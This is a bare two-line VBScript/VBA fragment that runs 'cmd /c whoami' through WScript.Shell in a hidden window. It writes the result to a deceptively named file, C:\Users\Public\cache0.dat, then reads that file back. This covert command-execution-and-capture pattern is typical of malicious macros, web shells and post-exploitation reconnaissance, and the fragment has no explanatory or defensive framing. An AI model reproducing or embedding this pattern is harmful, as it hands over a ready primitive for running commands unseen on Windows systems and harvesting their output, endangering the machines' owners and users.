CreateObject("Wscript.Shell").Run("cmd /c whoami > C:\Users\Public\cache0.dat 2>&1", 0, True)
CreateObject("Scripting.FileSystemObject").OpenTextFile("C:\Users\Public\cache0.dat", 1).ReadAll()                      
